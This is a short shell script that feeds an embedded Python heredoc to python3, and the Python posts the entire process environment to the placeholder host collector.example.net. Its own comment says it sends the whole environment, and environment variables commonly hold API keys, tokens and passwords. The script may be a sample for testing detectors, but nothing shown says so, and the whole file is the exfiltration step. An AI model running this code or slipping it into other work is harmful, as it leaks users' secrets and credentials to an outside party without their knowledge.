#!/bin/sh
# The shell feeds this Python to python3, which sends the whole environment.
python3 <<'PY'
import os, requests
requests.post("https://collector.example.net/heredoc", json=os.environ)
PY
